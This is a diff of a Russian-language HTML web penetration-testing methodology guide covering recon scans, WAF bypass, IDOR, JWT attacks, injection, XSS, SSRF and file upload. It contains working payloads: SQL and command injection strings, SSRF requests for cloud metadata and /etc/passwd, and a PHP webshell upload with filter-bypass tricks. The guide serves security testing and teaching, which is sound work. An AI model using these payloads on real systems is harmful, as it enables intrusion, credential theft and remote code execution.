+<div class="step" id="s6">
+  <h3><span class="num">2.1</span> Порты и сервисы</h3>
+  <p class="why">На сервере могут быть открыты двери помимо 80/443 — и за ними админки, базы, внутренние тулзы.</p>
+<pre>nmap -sV -sC -T4 --top-ports 1000 TARGET -oN nmap.txt
+
+# если разрешено и нужно всё:
+nmap -sV -sC -T4 -p- TARGET -oN nmap_full.txt</pre>
+
+  <details class="explain">
+  <summary>Что это значит (объяснение)</summary>
+  <div class="body">
+  <ul>
+  <li><span class="k">-sV</span> — версии программ на портах</li>
+  <li><span class="k">-sC</span> — стандартные проверочные скрипты</li>
+  <li><span class="k">-T</span> — скорость: <b>0</b> paranoid, <b>2</b> polite, <b>3</b> normal, <b>4</b> aggressive, <b>5</b> insane</li>
+  <li><span class="k">--top-ports 1000</span> — 1000 популярных портов · <span class="k">-p-</span> — все 65535</li>
+  </ul>
+  <p><b>Особое внимание портам:</b> 3000, 4000, 5000, 7000, 8000, 8080, 8081, 8443, 8888, 9000, 9090, 9200, 15672 — там живут внутренние панели (Grafana, Jenkins, Kibana, RabbitMQ, Spring).</p>
+  <p><span class="k">-T4</span> на живом боевом сайте может привлечь внимание — если есть WAF, снизь до <span class="k">-T2</span>.</p>
+  </div>
+  </details>
+</div>
+
+<div class="step" id="s7">
+  <h3><span class="num">2.2</span> Защита WAF</h3>
+  <p class="why">Результат задаёт «громкость» всех дальнейших сканов.</p>
 <pre>wafw00f -a https://TARGET</pre>
 
-<details class="explain">
-<summary>Что это значит (объяснение)</summary>
-<div class="body">
-<p><b>wafw00f</b> — определяет WAF по тому, как сервер отвечает.
-<span class="k">-a</span> (all) — проверить все известные подписи охранников, а не только первые.</p>
-<p><b>Что смотреть:</b> <span class="v">is behind Cloudflare/Akamai…</span> = охрана есть;
-<span class="v">No WAF detected</span> = охраны нет.</p>
-<p><b>Это не отдельный путь, а режим:</b></p>
-<ul>
-<li>WAF есть → тихо: <span class="k">-T2</span>, <span class="k">-t 10</span>, <span class="k">-c 25</span>, sqlmap <span class="k">--level 2 --risk 1</span></li>
-<li>WAF нет → можно громче: <span class="k">-T4</span>, <span class="k">-t 50</span>, <span class="k">-c 100</span></li>
-</ul>
+  <details class="explain">
+  <summary>Что это значит (объяснение)</summary>
+  <div class="body">
+  <p><span class="k">-a</span> — проверить все известные подписи WAF (Cloudflare, Akamai, Imperva, Sucuri, F5…).</p>
+  <p><b>Режимы:</b></p>
+  <ul>
+  <li>WAF есть → тихо: <span class="k">-T2</span>, <span class="k">-t 10</span>, <span class="k">-c 25</span>, <span class="k">-rl 50</span>, sqlmap <span class="k">--level 2 --risk 1</span>, и добавляй <span class="k">--tamper</span> в sqlmap</li>
+  <li>WAF нет → можно <span class="k">-T4</span>, <span class="k">-t 50</span>, <span class="k">-c 100</span></li>
+  </ul>
+  <p><b>Обход 403/WAF блокировок:</b> смена User-Agent, <code>X-Forwarded-For: 127.0.0.1</code>, <code>X-Original-URL</code>, задержки между запросами, кодирование payload.</p>
+  </div>
+  </details>
 </div>
-</details>
 
-<div class="branch">Развилки:</div>
-<button onclick="show('n3a')">is behind … (WAF есть)</button>
-<div class="next" id="n3a">→ тихий режим: <span class="flag">-T2</span>, <span class="flag">-t 10</span>, <span class="flag">-c 25</span>, <span class="flag">-rl 50</span>, sqlmap <span class="flag">--level 2 --risk 1</span></div>
-<button onclick="show('n3b')">No WAF detected</button>
-<div class="next" id="n3b">→ громкий режим: <span class="flag">-T4</span>, <span class="flag">-t 50</span>, <span class="flag">-c 100</span>, <span class="flag">-rl 150</span></div>
-<br><button class="go" onclick="go('step4')">Шаг 4 →</button>
+<div class="step" id="s8">
+  <h3><span class="num">2.3</span> Технологии сайта</h3>
+  <p class="why">Стек говорит, какие именно баги искать: Spring → actuator, Next.js → SSRF, старый jQuery → prototype pollution.</p>
+<pre>whatweb -a 3 https://TARGET
+httpx -u https://TARGET -tech-detect -title -web-server</pre>
+
+  <details class="explain">
+  <summary>Что это значит (объяснение)</summary>
+  <div class="body">
+  <p><span class="k">-a</span> (aggressiveness): <b>1</b> stealthy (один запрос), <b>2</b> polite, <b>3</b> aggressive (точно, заметно), <b>4</b> heavy.</p>
+  <p><b>Развилки по стеку:</b></p>
+  <table>
+  <tr><th>Видишь</th><th>Что проверять</th></tr>
+  <tr><td>WordPress</td><td>wpscan <span class="k">--enumerate ap,at,u</span> → CVE плагинов</td></tr>
+  <tr><td>Joomla</td><td>joomscan → компоненты, /administrator/</td></tr>
+  <tr><td>Drupal</td><td>droopescan → версии модулей</td></tr>
+  <tr><td>Spring Boot</td><td>/actuator/env, /actuator/heapdump, /actuator/gateway</td></tr>
+  <tr><td>Next.js</td><td>SSRF в image optimizer, <code>/_next/data/</code></td></tr>
+  <tr><td>React/Vue SPA</td><td>каталоги не работают → сразу JS-анализ и Burp</td></tr>
+  <tr><td>Swagger</td><td>/swagger.json, /api-docs → полная карта API</td></tr>
+  </table>
+  </div>
+  </details>
 </div>
-<div class="arrow">▼</div>
 
-<!-- ═══ ШАГ 4 ═══ -->
-<div class="step" id="step4">
-<h2><span class="badge">Шаг 4</span> Что за сайт внутри</h2>
-<p class="why">Сайты собраны на «движках» (CMS). У каждого свои дыры и свой инструмент проверки.</p>
-<pre>whatweb -a 3 https://TARGET</pre>
+<div class="step" id="s9">
+  <h3><span class="num">2.4</span> Виртуальные хосты</h3>
+  <p class="why">На одном IP может жить 20 сайтов, но в DNS виден один. Остальные находятся подстановкой заголовка Host.</p>
+<pre>ffuf -u https://TARGET -H "Host: FUZZ.TARGET" \
+    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+    -fs 1234 -t 50</pre>
 
-<details class="explain">
-<summary>Что это значит (объяснение)</summary>
-<div class="body">
-<p><b>whatweb</b> — «опознаватель» технологий: смотрит заголовки, cookie, HTML-теги и говорит, на чём сделан сайт.</p>
-<p><span class="k">-a</span> (aggressiveness) — агрессивность:
-<span class="v">1</span> = один тихий запрос,
-<span class="v">2</span> = чуть больше,
-<span class="v">3</span> = агрессивно, точнее всего (но заметно в логах),
-<span class="v">4</span> = heavy, может задеть сайт.</p>
-<p><b>Что смотреть:</b> название движка, версии, IP-адрес сервера.</p>
+  <details class="explain">
+  <summary>Что это значит (объяснение)</summary>
+  <div class="body">
+  <ul>
+  <li><span class="k">-H "Host: FUZZ.TARGET"</span> — подставляем разные имена в заголовок Host, сервер отвечает разными сайтами</li>
+  <li><span class="k">-fs 1234</span> — size filter: выбросить ответы с размером «страницы по умолчанию» (сначала запусти без него и посмотри, какой размер у заглушки)</li>
+  <li><span class="k">-t 50</span> — потоков</li>
+  </ul>
+  <p><b>Зачем:</b> внутренние стенды (<code>staging</code>, <code>jira</code>, <code>internal</code>) часто не имеют DNS-записи, но отвечают на Host.</p>
+  </div>
+  </details>
 </div>
-</details>
 
-<div class="branch">Развилки по выводу:</div>
-<button onclick="show('n4a')">WordPress</button>
-<div class="next" id="n4a">
-<pre>wpscan --url https://TARGET --enumerate ap,at,u --api-token <ТОКЕН>
-# ap = все плагины, at = все темы, u = пользователи</pre>
-→ нашёл <code>[!] Title: … [CVE-…]</code> → <code>searchsploit &lt;имя_плагина&gt;</code> → Шаг 8а
+<div class="step" id="s10">
+  <h3><span class="num">2.5</span> Check-list слабых мест</h3>
+  <p class="why">Быстрый автоматический обход на забытые файлы и настройки.</p>
+<pre>nikto -h https://TARGET -Tuning 12389 -o nikto.txt</pre>
+
+  <details class="explain">
+  <summary>Что это значит (объяснение)</summary>
+  <div class="body">
+  <p><span class="k">-Tuning</span>: <b>1</b> интересные файлы · <b>2</b> ошибки конфигурации · <b>3</b> утечка инфо · <b>4</b> инъекции · <b>8</b> выполнение команд · <b>9</b> SQLi · <b>6</b> DoS (на живом не включать).</p>
+  <p><b>Что смотреть:</b> строки с <span class="k">+</span>. Ценно: <code>/admin</code>, <code>backup.zip</code>, <code>.env</code>, <code>phpinfo.php</code>, <code>/server-status</code>, <code>.git/config</code>.</p>
+  <p><span class="v">0 item(s) reported</span> — чисто, идём дальше.</p>
+  </div>
+  </details>
 </div>
-<button onclick="show('n4b')">Joomla</button>
-<div class="next" id="n4b">
-<pre>joomscan -u https://TARGET
-searchsploit joomla</pre>
-→ нашёл админку <code>/administrator/</code> → Шаг 9 · нашёл CVE → Шаг 8а
+
+<div class="step" id="s11">
+  <h3><span class="num">2.6</span> Скрытые пути</h3>
+  <p class="why">Страницы без ссылок в меню: <code>/api</code>, <code>/backup</code>, <code>/test</code>, <code>/internal</code>.</p>
+<pre>ffuf -u https://TARGET/FUZZ \
+    -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
+    -mc 200,204,301,302,307,401,403 -t 50 -o fuzz.txt
+
+# с расширениями:
+ffuf -u https://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
+    -e .php,.html,.bak,.zip,.json,.txt -mc 200,301,403</pre>
+
+  <details class="explain">
+  <summary>Что это значит (объяснение)</summary>
+  <div class="body">
+  <ul>
+  <li><b>FUZZ</b> — место подстановки слова из словаря</li>
+  <li><span class="k">-mc</span> (match codes) — какие коды считать находкой: <b>200</b> есть, <b>301/302</b> есть (редирект), <b>401/403</b> есть, но закрыто</li>
+  <li><span class="k">-e</span> — дописывать расширения</li>
+  <li><span class="k">-fs / -fw / -fl</span> — фильтр по размеру ответа / числу слов / строк (убирает «страницу-заглушку»)</li>
+  <li><span class="k">-ac</span> — auto-calibrate: ffuf сам определяет размер заглушки и фильтрует</li>
+  </ul>
+  <p><b>Целевой фаззинг вместо слепого:</b> сначала определи стек (Шаг 2.3), потом бери словарь под него. Не валить 5-миллионный словарь в корень сайта.</p>
+  <p><b>Методы:</b> проверь не только GET. Некоторые эндпоинты принимают <code>PUT</code>/<code>DELETE</code> без авторизации:</p>
+  <pre>for m in GET POST PUT DELETE PATCH OPTIONS; do
+  curl -X $m -s -o /dev/null -w "$m: %{http_code}\n" https://TARGET/api/users/1
+done</pre>
+  </div>
+  </details>
 </div>
-<button onclick="show('n4c')">Drupal</button>
-<div class="next" id="n4c">
-<pre>droopescan scan drupal -u https://TARGET
-searchsploit drupal</pre>
+
+<div class="step" id="s12">
+  <h3><span class="num">2.7</span> Шаблоны известных уязвимостей</h3>
+  <p class="why">Тысячи готовых проверок конкретных CVE и ошибок настройки за один прогон.</p>
+<pre>nuclei -update-templates
+nuclei -u https://TARGET -severity low,medium,high,critical -c 50 -rl 100 -o nuclei.txt
+
+# по списку живых хостов:
+nuclei -l live.txt -severity medium,high,critical -c 50 -o nuclei_all.txt
+
+# под конкретный стек / тип:
+nuclei -u https://TARGET -tags apache,nginx,exposures,misconfig,cve -severity medium,high,critical
+nuclei -u https://TARGET -t cves/ -tags rce</pre>
+
+  <details class="explain">
+  <summary>Что это значит (объяснение)</summary>
+  <div class="body">
+  <ul>
+  <li><span class="k">-severity</span> — <code>info</code> → <code>low</code> → <code>medium</code> → <code>high</code> → <code>critical</code></li>
+  <li><span class="k">-tags</span> — только шаблоны с этими метками</li>
+  <li><span class="k">-c</span> — шаблонов параллельно (<b>25</b> тихо, <b>100</b> быстро)</li>
+  <li><span class="k">-rl</span> — запросов в секунду</li>
+  <li><span class="k">-t</span> — конкретная папка шаблонов (<code>cves/</code>, <code>exposures/</code>, <code>misconfigurations/</code>)</li>
+  </ul>
+  <div class="warn">«Spray and pray» — прогнать одни и те же шаблоны по тысячам хостов. Современный WAF видит это как фоновый шум. Лучше: точные теги под стек + ручная проверка найденного.</div>
+  <p><b>Куда дальше:</b> нашёл <span class="v">[critical] [cve]</span> → Фаза 5 (Metasploit). Нашёл <span class="v">misconfig</span> → открой URL в браузере. Пусто → Фаза 3.</p>
+  </div>
+  </details>
 </div>
-<button onclick="show('n4d')">Ничего не опознано / SPA</button>
-<div class="next" id="n4d">→ CMS не определена. У React/Vue-сайтов папок почти нет → Шаг 5, затем сразу Шаг 10 (Burp).</div>
-<button onclick="show('n4e')">Известна версия сервера</button>
-<div class="next" id="n4e">→ <code>searchsploit &lt;сервер&gt; &lt;версия&gt;</code> + в Шаге 7б добавь тег технологии</div>
-<br><button class="go" onclick="go('step5')">Шаг 5 →</button>
+
+<!-- ═════ ФАЗА 3 ═════ -->
+<div class="phase" id="p3">
+  <h2>Фаза 3 · Карта приложения (руками)</h2>
+  <p>Здесь начинается то, что автоматика не умеет. По оценкам практиков — самый результативный этап.</p>
 </div>
-<div class="arrow">▼</div>
 
-<!-- ═══ ШАГ 5 ═══ -->
-<div class="step" id="step5">
-<h2><span class="badge">Шаг 5</span> Известные слабости (nikto)</h2>
-<p class="why">Автоматический «чек-лист» на тысячи мелких ошибок: забытые файлы, бэкапы, тестовые страницы.</p>
-<pre>nikto -h https://TARGET -Tuning 12389</pre>
+<div class="step" id="s13">
+  <h3><span class="num">3.1</span> Burp: карта + роли</h3>
+  <p class="why">Сканер ищет «известные» баги. А баги доступа — «кто чьими данными владеет» — находит только человек с двумя аккаунтами.</p>
+<pre>burpsuite    # браузер → прокси 127.0.0.1:8080, установить CA-сертификат Burp</pre>
 
-<details class="explain">
-<summary>Что это значит (объяснение)</summary>
-<div class="body">
-<p><b>nikto</b> делает много мелких проверок и выдаёт список подозрительного.</p>
-<p><span class="k">-Tuning</span> — какие категории включить:
-<span class="v">1</span> интересные файлы,
-<span class="v">2</span> ошибки настроек,
-<span class="v">3</span> утечка информации,
-<span class="v">4</span> инъекции,
-<span class="v">8</span> выполнение команд,
-<span class="v">9</span> SQL-инъекции.
-<span class="v">6</span> = DoS-тесты (нагрузка) — на живом сайте лучше не включать.</p>
-<p><b>Что смотреть:</b> строки, начинающиеся с <span class="k">+</span> — это находки.</p>
+  <details class="explain">
+  <summary>Что это значит (объяснение)</summary>
+  <div class="body">
+  <p><b>Порядок работы (ритуал, а не «нажать Scan»):</b></p>
+  <ul>
+  <li><b>1.</b> Зарегистрируй аккаунты на <b>всех</b> доступных ролях: гость, обычный юзер, модератор, админ</li>
+  <li><b>2.</b> Пройди ВЕСЬ сайт через прокси: каждая страница, каждая форма, каждый AJAX-запрос</li>
+  <li><b>3.</b> Открой <code>Target → Site map</code> — это и есть карта поверхности атаки</li>
+  <li><b>4.</b> Выпиши все места, где встречаются <b>ID, роль, статус, цена, счётчик</b> — это кандидаты на логические баги</li>
+  <li><b>5.</b> Скопируй сайтмап в заметки: эндпоинт → метод → параметры → какая роль</li>
+  </ul>
+  <p><b>Ключевая мысль:</b> 80% поверхности — это <b>залогиненная</b> часть. Тестировать только главную страницу — тестировать почти ничего.</p>
+  <div class="tip">Отключи «сканер» в голове и включи «пользователя»: что эта кнопка должна делать? Что будет, если я нажму её дважды? Если поменяю порядок? Если отправлю без предыдущего шага?</div>
+  </div>
+  </details>
 </div>
-</details>
 
-<div class="branch">Развилки:</div>
-<button onclick="show('n5a')">+ /admin/ или /login found</button>
-<div class="next" id="n5a">→ открой в браузере, запомни путь → потом Шаг 9 (hydra)</div>
-<button onclick="show('n5b')">+ backup.zip / .bak / .old</button>
-<div class="next" id="n5b">→ скачай: <code>wget https://TARGET/backup.zip</code> — внутри бывают пароли и исходники</div>
-<button onclick="show('n5c')">+ htaccess.txt / LICENSE / README</button>
-<div class="next" id="n5c">→ открой в браузере: подсказывает CMS и версию</div>
-<button onclick="show('n5d')">+ phpinfo / upload / admin panel</button>
-<div class="next" id="n5d">→ <code>/phpinfo.php</code> показывает пути и версии; открытая загрузка = кандидат на шелл</div>
-<button onclick="show('n5e')">0 item(s) reported</button>
-<div class="next" id="n5e">→ чисто → Шаг 6</div>
-<br><button class="go" onclick="go('step6')">Шаг 6 →</button>
+<!-- ═════ ФАЗА 4 ═════ -->
+<div class="phase" id="p4">
+  <h2>Фаза 4 · Ручное тестирование по классам</h2>
+  <p>По одному классу уязвимости за раз, по каждому входу. Не останавливайся на первой находке.</p>
 </div>
-<div class="arrow">▼</div>
 
-<!-- ═══ ШАГ 6 ═══ -->
-<div class="step" id="step6">
-<h2><span class="badge">Шаг 6</span> Скрытые папки</h2>
-<p class="why">На сайте часто есть страницы без ссылок в меню: <code>/admin</code>, <code>/backup</code>, <code>/test</code>. Их находят перебором имён.</p>
-<pre>gobuster dir -u https://TARGET \
-  -w /usr/share/wordlists/dirb/common.txt \
-  -x php,html,txt,bak,zip -t 10</pre>
+<div class="step" id="s14">
+  <h3><span class="num">4.1</span> IDOR / доступ к чужим данным</h3>
+  <p class="why">Класс №1 по выплатам. Сервер отдаёт объект по ID, не проверяя, твой ли он.</p>
+<pre># ритуал:
+# 1) аккаунт A создаёт объект (заказ, тикет, профиль)
+# 2) берём запрос в Burp Repeater
+# 3) подставляем сессию аккаунта B + ID объекта A
+# ожидаем 403/404, баг = 200 + данные A</pre>
 
-<details class="explain">
-<summary>Что это значит (объяснение)</summary>
-<div class="body">
-<ul>
-<li><span class="k">dir</span> — режим поиска каталогов</li>
-<li><span class="k">-w</span> — словарь: текстовый файл, где по одному имени в строке (admin, backup, test…)</li>
-<li><span class="k">-x</span> — дописывать расширения: <code>index</code> + <code>.php</code> = <code>index.php</code></li>
-<li><span class="k">-t</span> — сколько проверок одновременно: <b>10</b>=вежливо, <b>50</b>=быстро, <b>100</b>=сайт может «икнуть»</li>
-</ul>
-<p><b>Читаем только по коду ответа:</b></p>
-<ul>
-<li><span class="v">200</span> — страница есть, открывай</li>
-<li><span class="v">301 / 302</span> — есть (переехала)</li>
-<li><span class="v">403</span> — есть, но не пускает</li>
-<li><span class="v">404</span> — не существует</li>
-</ul>
+  <details class="explain">
+  <summary>Что это значит (объяснение)</summary>
+  <div class="body">
+  <p><b>Где искать ID:</b></p>
+  <ul>
+  <li>в пути: <code>/api/users/<b>123</b></code>, <code>/orders/<b>456</b></code></li>
+  <li>в query: <code>?user_id=123</code>, <code>?invoice=456</code></li>
+  <li>в теле: <code>{"invoice_id": 123}</code></li>
+  <li>в заголовках: <code>X-User-Id</code>, <code>X-Tenant</code></li>
+  <li>в GraphQL-переменных</li>
+  </ul>
+  <p><b>Варианты:</b> UUID — тоже не защита, если он «утекает» в другом ответе. Путь <code>/users/me</code> → <code>/users/../admin</code>.</p>
+  <p><b>Вертикальный доступ:</b> обычным юзером открыть админский эндпоинт. Обходы 403:</p>
+  <pre>/admin  →  /admin/  →  /Admin  →  /admin;/  →  /admin%20
+GET запрещён → POST разрешён
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Forwarded-For: 127.0.0.1</pre>
+  <p><b>Почему сканер не найдёт:</b> для этого нужны два аккаунта и понимание, «чей» объект. Сканер работает в одной сессии.</p>
+  </div>
+  </details>
 </div>
-</details>
 
-<div class="branch">Развилки:</div>
-<button onclick="show('n6a')">/admin, /login, /panel</button>
-<div class="next" id="n6a">→ Шаг 9 (hydra)</div>
-<button onclick="show('n6b')">/.git или /.env</button>
-<div class="next" id="n6b">
-<pre>git-dumper https://TARGET/.git ./src   # исходники
-curl https://TARGET/.env              # пароли БД</pre>
+<div class="step" id="s15">
+  <h3><span class="num">4.2</span> Аутентификация и сессии</h3>
+  <p class="why">Слабый сброс пароля или вечная сессия = захват аккаунта без всяких инъекций.</p>
+<pre># чек-лист руками в Burp Repeater
+# 1. сброс пароля: токен одноразовый? истекает? привязан к юзеру?
+# 2. logout — сессия реально умирает? (повтори старый запрос)
+# 3. смена пароля — старые сессии живы?
+# 4. rate limit на логине есть? (отправь 50 попыток)
+# 5. перечисление юзеров: "нет такого" vs "неверный пароль"</pre>
+
+  <details class="explain">
+  <summary>Что это значит (объяснение)</summary>
+  <div class="body">
+  <p><b>JWT-проверки:</b></p>
+  <ul>
+  <li><code>alg: none</code> — попробуй подписать токен без подписи</li>
+  <li>подмени claim <code>{"role":"user"}</code> → <code>{"role":"admin"}</code> и подпиши известным секретом (частые: <code>secret</code>, <code>your-256-bit-secret</code>)</li>
+  <li><code>kid</code>-инъекция, пустой ключ (<code>alg: HS256</code> с публичным ключом RSA)</li>
+  <li>Инструмент: <b>jwt_tool</b> — <code>python3 jwt_tool.py TOKEN -T</code> (все атаки автоматически)</li>
+  </ul>
+  <p><b>MFA:</b> подмени ответ «code_required: true» → false; отправь пустой код; переиспользуй код; брут 4-значный код без rate limit.</p>
+  <p><b>OAuth:</b> отсутствие <code>state</code> = CSRF на вход. <code>redirect_uri</code> без проверки = утечка токена (часто в цепочке с open redirect).</p>
+  </div>
+  </details>
 </div>
-<button onclick="show('n6c')">/uploads, /files</button>
-<div class="next" id="n6c">→ после входа в панель пробуй залить туда <code>shell.php</code></div>
-<button onclick="show('n6d')">Только 404</button>
-<div class="next" id="n6d">→ Шаг 7</div>
-<br><button class="go" onclick="go('step7')">Шаг 7 →</button>
+
+<div class="step" id="s16">
+  <h3><span class="num">4.3</span> Бизнес-логика</h3>
+  <p class="why">По оценкам практиков, 73% успешных хантеров ставят этот класс выше технических багов.</p>
+<pre># проверяй сценарии, а не параметры:
+# купон применить дважды / к чужой корзине / после истечения
+# отрицательное количество: qty=-1
+# цена в запросе: price=100 → price=1
+# пропустить шаг оформления (перейти сразу к /pay)
+# отменить чужой заказ; вернуть товар дважды</pre>
+
+  <details class="explain">
+  <summary>Что это значит (объяснение)</summary>
+  <div class="body">
+  <p>Бизнес-логика — это «сайт делает не то, что задумал создатель». Никакой payload тут не нужен, нужен вопрос: <b>«а что если…»</b></p>
+  <ul>
+  <li>Что если отправить шаг 3, не выполнив шаг 2?</li>
+  <li>Что если число будет отрицательным / нулём / очень большим?</li>
+  <li>Что если повторить действие 100 раз параллельно?</li>
+  <li>Что если подставить чужой ID в шаг, где его обычно не меняют?</li>
+  <li>Что если покупатель — сам себе продавец?</li>
+  </ul>
+  <p><b>Именно тут</b> «чистый отчёт сканера» и реальная уязвимость расходятся сильнее всего.</p>
+  </div>
+  </details>
 </div>
-<div class="arrow">▼</div>
 
-<!-- ═══ ШАГ 7 ═══ -->
-<div class="step" id="step7">
-<h2><span class="badge">Шаг 7</span> Шаблоны уязвимостей (nuclei) → Metasploit</h2>
-<p class="why">База из тысяч готовых проверок конкретных CVE и ошибок настройки. Один запуск — тысячи проверок.</p>
-<pre># 7а — общий прогон
-nuclei -update-templates
-nuclei -u https://TARGET \
-  -severity low,medium,high,critical -c 50 -rl 100 -o nuclei.txt
+<div class="step" id="s17">
+  <h3><span class="num">4.4</span> Инъекции: SQL / команды / шаблоны</h3>
+  <p class="why">Проверяй каждый параметр, дошедший до сервера или базы.</p>
+<pre># признак SQLi: одиночная кавычка → 500 / ошибка SQL
+?id=1'
+?id=1 AND 1=1      → тот же ответ
+?id=1 AND 1=2      → другой ответ     = boolean-based
+?id=1'||(SELECT SLEEP(5))||'          = time-based
 
-# 7б — прицельный (тег технологии из Шага 4)
-nuclei -u https://TARGET \
-  -tags wordpress,joomla,drupal,apache,nginx,cve,misconfig \
-  -severity low,medium,high,critical</pre>
+# инъекция команд:
+?ip=127.0.0.1;id
+?host=127.0.0.1|whoami
+?name=$(id)
 
-<details class="explain">
-<summary>Что это значит (объяснение)</summary>
-<div class="body">
-<ul>
-<li><span class="k">-severity</span> — важность: <code>info</code> (просто инфо) → <code>low</code> → <code>medium</code> → <code>high</code> → <code>critical</code> (самое опасное)</li>
-<li><span class="k">-tags</span> — запускать только шаблоны с этими метками</li>
-<li><span class="k">-c</span> — сколько шаблонов параллельно (<b>25</b> тихо, <b>100</b> быстро)</li>
-<li><span class="k">-rl</span> — запросов в секунду</li>
-</ul>
-<p><b>Что смотреть:</b> строки с <span class="v">[critical]</span>, <span class="v">[high]</span>, <span class="v">[CVE-XXXX]</span>, <span class="v">[rce]</span>, <span class="v">[sqli]</span> — каждая такая строка = реальная найденная дыра и адрес, где она живёт.</p>
+# SSTI (движок шаблонов):
+{{7*7}}      → 49 ?
+${7*7}       → 49 ?
+<%= 7*7 %>   → 49 ?</pre>
+
+  <details class="explain">
+  <summary>Что это значит (объяснение)</summary>
+  <div class="body">
+  <ul>
+  <li><b>SQLi</b>: кавычка ломает запрос → ошибка БД = есть контакт. Дальше — Фаза 5 (sqlmap)</li>
+  <li><b>Command injection</b>: разделители <code>;</code> <code>|</code> <code>&amp;&amp;</code> <code>``</code> <code>$( )</code> <code>%0a</code>. Ищи функции, которые «что-то запускают»: ping, конвертация картинок, резервное копирование, DNS-lookup</li>
+  <li><b>SSTI</b>: <code>{{7*7}}</code> вернуло 49 — значит сервер рендерит твой ввод как шаблон. Дальше — payload под движок (Jinja2, Twig, Freemarker) → RCE</li>
+  <li><b>NoSQL</b>: <code>{"user":"admin","pass":{"$ne":null}}</code> — обход логина</li>
+  </ul>
+  <p><b>Инструмент</b>: <b>commix</b> для командных инъекций, <b>sqlmap</b> для SQL (Фаза 5).</p>
+  </div>
+  </details>
 </div>
-</details>
 
-<div class="branch">▼ Что нашёл nuclei → команда Metasploit</div>
+<div class="step" id="s18">
+  <h3><span class="num">4.5</span> XSS</h3>
+  <p class="why">Отражение в ответе ≠ выполнение. Подтверждай в браузере и в реальном контексте.</p>
+<pre>"><svg onload=alert(1)>
+javascript:alert(1)
+<img src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
 
-<button class="red" onclick="show('m1')">[critical] [cve] → RCE</button>
-<div class="next msf" id="m1">
-<h3>Metasploit · <span class="vuln">[имя уязвимости из nuclei]</span></h3>
+dalfox url "https://TARGET/search?q=test" --deep-domxss</pre>
+
+  <details class="explain">
+  <summary>Что это значит (объяснение)</summary>
+  <div class="body">
+  <p><b>Три типа:</b></p>
+  <ul>
+  <li><b>Reflected</b> — payload в ответе сразу, живёт одну ссылку</li>
+  <li><b>Stored</b> — payload сохраняется и показывается другим (комментарий, имя профиля, заявка в поддержку). <b>Самый ценный</b>, потому что может сработать у админа</li>
+  <li><b>DOM</b> — JS берёт из адреса <code>#</code> или параметра и кладёт в <code>innerHTML</code>. Сервер вообще не участвует</li>
+  </ul>
+  <p><b>Как искать DOM-sink:</b> DevTools → Sources → Event Listener Breakpoints → DOM mutation. Ходи по сайту, при срабатывании смотри стек вызовов: твой ввод попадает в <code>innerHTML</code>, <code>document.write</code>, <code>eval</code>, <code>location.href</code>?</p>
+  <p><b>Blind XSS:</b> вставь payload с внешним сборщиком (например собственный вебхук) в поля поддержки/фидбека — если сработает в админке, получишь уведомление.</p>
+  <div class="warn">Найден XSS — не спеши отчитываться. Покажи реальный импакт: кража cookie сессии, CSRF-токена, действие от лица пользователя.</div>
+  </div>
+  </details>
+</div>
+
+<div class="step" id="s19">
+  <h3><span class="num">4.6</span> SSRF и перенаправления</h3>
+  <p class="why">Сервер по твоей просьбе сходит по адресу — и может зайти туда, куда тебе нельзя.</p>
+<pre># ищи параметры: url, uri, path, src, dest, redirect, callback, webhook, next, return
+?url=http://169.254.169.254/latest/meta-data/
+?url=file:///etc/passwd
+?url=http://127.0.0.1:6379/
+?next=https://evil.tld
+?next=//evil.tld
+?next=https://TARGET@evil.tld</pre>
+
+  <details class="explain">
+  <summary>Что это значит (объяснение)</summary>
+  <div class="body">
+  <ul>
+  <li><b>169.254.169.254</b> — внутренний адрес метаданных облака (AWS/GCP). Там бывают ключи доступа</li>
+  <li><b>127.0.0.1:порт</b> — доступ к внутренним сервисам, закрытым снаружи</li>
+  <li><b>file://</b> — чтение локальных файлов</li>
+  <li>Фичи с SSRF: предпросмотр ссылки, импорт по URL, экспорт в PDF, обработка изображений из URL, RSS</li>
+  </ul>
+  <p><b>Open redirect</b> сам по себе «низкий», но в цепочке с OAuth = кража токена = захват аккаунта (см. раздел «Цепочки»).</p>
+  <p><b>Как подтвердить:</b> направь на свой сервер/Burp Collaborator и убедись, что запрос пришёл с IP цели.</p>
+  </div>
+  </details>
+</div>
+
+<div class="step" id="s20">
+  <h3><span class="num">4.7</span> Загрузка файлов</h3>
+  <p class="why">Правильно обойдённый фильтр = выполнение кода на сервере.</p>
+<pre>shell.php
+shell.pHp
+shell.php.jpg
+shell.php%00.jpg
+shell.phtml
+shell.phar
+
+# Content-Type: image/png при PHP-содержимом
+# магические байты: добавить в начало файла  \x89PNG\r\n\x1a\n
+# содержимое:  <?php system($_GET['cmd']); ?></pre>
+
+  <details class="explain">
+  <summary>Что это значит (объяснение)</summary>
+  <div class="body">
+  <ol>
+  <li><b>Расширение</b> — сервер может блокировать только <code>.php</code>, но пускать <code>.phtml</code>, <code>.phar</code>, <code>.php5</code></li>
+  <li><b>Двойное расширение</b> — <code>shell.jpg.php</code></li>
+  <li><b>Content-Type</b> — подмена заголовка при реальном PHP-содержимом</li>
+  <li><b>Магические байты</b> — файл начинается как картинка, но содержит PHP</li>
+  <li><b>Регистр/Unicode</b> — <code>shell.pHp</code></li>
+  </ol>
+  <p><b>После загрузки:</b> найди, куда файл лёг (смотри ответ сервера), и открой напрямую. Если выполняется — <code>?cmd=whoami</code> = RCE.</p>
+  <p><b>Побочные импакты:</b> SVG с XSS, DOCX с XXE, ZIP-архив с path traversal (zip slip).</p>
+  </div>
+  </details>
+</div>
+
+<div class="step" id="s21">
+  <h3><span class="num">4.8</span> Гонки (race conditions)</h3>
+  <p class="why">Сервер проверяет «уже использовано?» и только потом записывает. Отправь 50 запросов одновременно — и он не заметит.</p>
+<pre># Burp → Repeater → выбрать запрос → Send group in parallel
+# инструменты:
+# turbo-intruder (расширение Burp), race-the-web
+# single-packet attack доступен в новых версиях Burp</pre>
+
+  <details class="explain">
+  <summary>Что это значит (объяснение)</summary>
+  <div class="body">
+  <p><b>Классика:</b></p>
+  <ul>
+  <li>купон применяется 2+ раза</li>
+  <li>вывод средств больше баланса</li>
+  <li>обход лимита попыток входа</li>
+  <li>дважды вернуть товар</li>
+  <li>TOCTOU: «проверил — потом использовал» разнесено во времени</li>
+  </ul>
